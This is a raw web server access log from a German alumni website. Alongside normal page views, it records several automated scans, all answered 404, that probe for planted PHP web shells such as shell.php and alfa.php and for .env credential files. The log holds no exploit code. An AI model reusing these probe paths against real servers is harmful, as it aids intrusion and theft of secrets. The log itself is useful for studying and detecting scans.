277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:06;;/radio.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:07;;/manager.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:07;;/we2.php;GET;404
2c1ddbd5dfd6a2e1d8f7f9217b94dfdb26cbb6642e1219c3ceea12931cdc91c3;2025-11-02 07:57:07;;/personen/alumni/details/josephine-muller;GET;200
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:07;;/wp-includes/IXR/about.php;GET;404
94ca4aab945f3c5d8ae46849a9708eb87e1396a5067a0d9027edcffbf8c864b0;2025-11-02 07:57:07;;/themen/details/abschied-aus-moabit;GET;200
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:07;;/mar.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:08;;/lv.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:08;;/mail.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:08;;/wp-content/themes/aahana/json.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:08;;/aipoyp.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:09;;/db.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:09;;/m.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:09;;/up.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:10;;/dfre.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:10;;/men.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:10;;/media.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:10;;/wp-content/cong.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:11;;/uplozyu.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:11;;/wp-includes/Text/wp-conflg.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:11;;/shell.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:11;;/system.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:12;;/num.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:12;;/zc-749.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:12;;/bala.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:13;;/item.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:13;;/000.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:13;;/file22.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:13;;/jf1d22.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:14;;/asd67.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:14;;/Okxob.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:14;;/mah.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:14;;/goat1.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:15;;/naxc.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:15;;/lock360.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:15;;/ini.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:15;;/uploat.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:16;;/wp-includes/style-engine/index.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:16;;/wp-configs.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:16;;/zc-903.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:17;;/about/function.php;GET;404
94ca4aab945f3c5d8ae46849a9708eb87e1396a5067a0d9027edcffbf8c864b0;2025-11-02 07:57:17;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:17;;/wp-admin/log.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:17;;/oxvrws.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:17;;/we.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:18;;/02.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:18;;/system_log.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:18;;/CLA.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:18;;/sk25_1.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:19;;/autoload_classmap.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:19;;/css/xp.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:19;;/file21.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:19;;/himu.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:20;;/hn.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:20;;/as/function.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:20;;/flower.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:20;;/f35.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:21;;/doc.php;GET;404
94ca4aab945f3c5d8ae46849a9708eb87e1396a5067a0d9027edcffbf8c864b0;2025-11-02 07:57:21;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:21;;/tentang_rmol.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:21;;/pass.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:22;;/classwithtostring.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:22;;/jp.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:22;;/cc.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-02 07:57:22;;/file5.php;GET;404
1d4b601600c46a665a6c41cfa04a06981796b55fb3ec5bff51e7990e59dc5089;2025-11-02 08:01:02;;/config/dev.env;GET;404
1d4b601600c46a665a6c41cfa04a06981796b55fb3ec5bff51e7990e59dc5089;2025-11-02 08:01:02;;/api/config.env;GET;404
1d4b601600c46a665a6c41cfa04a06981796b55fb3ec5bff51e7990e59dc5089;2025-11-02 08:01:03;;/config/env.php;GET;404
1d4b601600c46a665a6c41cfa04a06981796b55fb3ec5bff51e7990e59dc5089;2025-11-02 08:01:03;;/config/env.txt;GET;404
1d4b601600c46a665a6c41cfa04a06981796b55fb3ec5bff51e7990e59dc5089;2025-11-02 08:01:04;;/configs/db.env;GET;404
1d4b601600c46a665a6c41cfa04a06981796b55fb3ec5bff51e7990e59dc5089;2025-11-02 08:01:06;;/anaconda/..env;GET;404
54a0a149b51189eb4050a1b55e76541f8f7c7c697ca4b0cd420a48d125f6d941;2025-11-02 08:07:58;;/;GET;200
87c563e54105cc51b1505c6eb9a1b19d380693627850c10406ed4a2b35bb3f1b;2025-11-02 08:09:17;;/about/allgemein;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-02 08:14:23;;/personen/alumni/details/luca-onorini;GET;200
917e2ce768ddd61971f81829609fcabe5b1ae4d9b166b1a15e10571d4eea8434;2025-11-02 08:14:51;;/;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-02 08:15:28;/themen?category=bildung;/themen/details/was-kommt-nach-dem-abitur;GET;200
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-02 08:17:47;;/;GET;200
e887c35cb3a93bc576d119b8ab127ee19c49e6e47e6f8730ef9bae8947de817e;2025-11-02 08:19:33;;/themen/details/der-start-ins-studium;GET;200
054257b237b49767d80dfafcba11f839991e6388e51f1ad5f85e45a555a4a4ca;2025-11-02 08:22:51;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:23:55;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:23:57;;/error.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:23:57;;/031.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:23:58;;/ilex.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:23:58;;/flex.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:23:59;;/mlex.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:23:59;;/wlex.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:00;;/wp-aaa.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:01;;/klex.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:01;;/about3.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:02;;/222.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:02;;/444.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:03;;/file9.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:03;;/filesss.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:04;;/file88.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:05;;/gifclass4.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:05;;/class-wp.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:06;;/555.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:06;;/333.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:07;;/hly.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:07;;/d12.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:08;;/2clas.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:08;;/bless5.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:09;;/file15.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:10;;/hk.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:10;;/alpa.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:11;;/file21.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:11;;/ssss.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:12;;/ut.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:12;;/inde.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:13;;/classgoto24.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:14;;/030.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:14;;/thh.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:15;;/fffff.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:15;;/indo.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:16;;/fileas.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:16;;/yellow.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:17;;/33.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:18;;/plss3.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:18;;/he.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:19;;/thxt.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:20;;/wfile.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:20;;/class20.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:21;;/build.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:21;;/1.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:22;;/usep.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:23;;/wa.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:23;;/wb.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:24;;/file1.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:24;;/2.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:25;;/a2.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:25;;/a.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:26;;/gmo.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:27;;/info.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:27;;/file2.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:28;;/lv.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:28;;/about.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:29;;/abcd.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:30;;/lock360.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:30;;/alfa.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:31;;/NewFile.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:31;;/atomlib.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:32;;/--.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:33;;/system_log.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:33;;/pp.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:34;;/geck.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:34;;/gm.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:35;;/makeasmtp.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:35;;/cccc.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:36;;/file4.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:36;;/520.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:37;;/admin.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:37;;/7.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:38;;/CLA.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:39;;/file18.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:39;;/ffile.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:40;;/file7.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:40;;/we.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:41;;/gfile.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:42;;/jlex3.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:42;;/des.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:43;;/aaa.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:44;;/gifclass.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:45;;/vee.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:46;;/efile.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:47;;/afile.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:47;;/errorfile.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:48;;/f35.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:49;;/gool.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:50;;/haikh.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:51;;/135.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:51;;/enclas.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:52;;/ioxi-o.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:53;;/wp-admin/js/wp-conflg.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:54;;/classwithtostring.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:55;;/image.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:55;;/wp-admin/wp-conflg.php?p=;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:56;;/mail.php?;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:57;;/sx.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:58;;/max.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:24:59;;/size.php?p=;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:00;;/mpxct.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:00;;/0xx.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:01;;/s.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:02;;/hq.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:03;;/blox.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:04;;/ant.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:04;;/fso.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:05;;/htaccess.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:06;;/wp-trackback.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:07;;/wp-admin/about.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:08;;/readme.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:08;;/v.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:09;;/sck.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:10;;/X7x.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:11;;/xpass.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:12;;/zoz.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:12;;/bless.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:13;;/bless2.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:14;;/bless6.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:15;;/bless10.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:16;;/bless11.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:16;;/wp-admin/js/index.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:17;;/thoms.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:18;;/xcre1.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:19;;/xsas.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:20;;/xrp.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:20;;/wp-freya.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:21;;/jatuh.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:22;;/css/index.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:23;;/file30.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:24;;/fesa.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:24;;/class-.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:25;;/.well-known/gecko-litespeed.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:26;;/wp-includes/block-patterns/index.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:27;;/up.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-02 08:25:28;;/403.php;GET;404
f0cab535b4832c1d8f3105e935e32f06c13cadb5ca0b8dbebe9054dd6e11ba35;2025-11-02 08:28:04;;/themen/details/der-start-ins-studium;GET;200
0e43eb4defe0961c09f52eeda3aba83b93cb689021a561d24c989a64075fcf3a;2025-11-02 08:28:41;;/aktuelles/stellenangebote;GET;200
f1b9231857b0d3585bb64cb847cc999d70e12bb0672fd9bedbf58229f28b860a;2025-11-02 08:31:08;;/;GET;200
a0f4d2d3869c765a0ec69a8ba65f522de59824a47ad8dad613b39128bf494597;2025-11-02 08:31:09;;/;GET;200
40d1473c7378b6a9722a5fed8811902757da1048a6a9cc31371da11ef87222a3;2025-11-02 08:35:25;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
2adb54f59cba46fd351a344d02f4730ca6cdb248eff94d3eb62b1c082c0ee3b8;2025-11-02 08:38:43;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
f3605c39276d0b38c447183d61d29767066c24193209b72732cd1f19ea2b05f3;2025-11-02 08:44:46;;/personen/alumni/schule/MP001;GET;200
d505d1b0cadaa5275e04a69fd4adece066afb1add0f5664881dd0fdad914c1c4;2025-11-02 08:46:15;;/personen;GET;200
d1644c44dbec9387b99e5ecece0f98319cd6a225b8e895a503073a83960fd181;2025-11-02 08:48:45;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
a86c7ddb7cafc4d8dc2c73a3fd4a75bf09c9b01deecd09a2e8866f856369e090;2025-11-02 08:54:20;;/personen/alumni/schule/MP004;GET;200
68e1a8e72ea995310d48d6211a66d52ef14e23ecd34573c332cce66a3740664f;2025-11-02 08:58:47;;/personen;GET;200
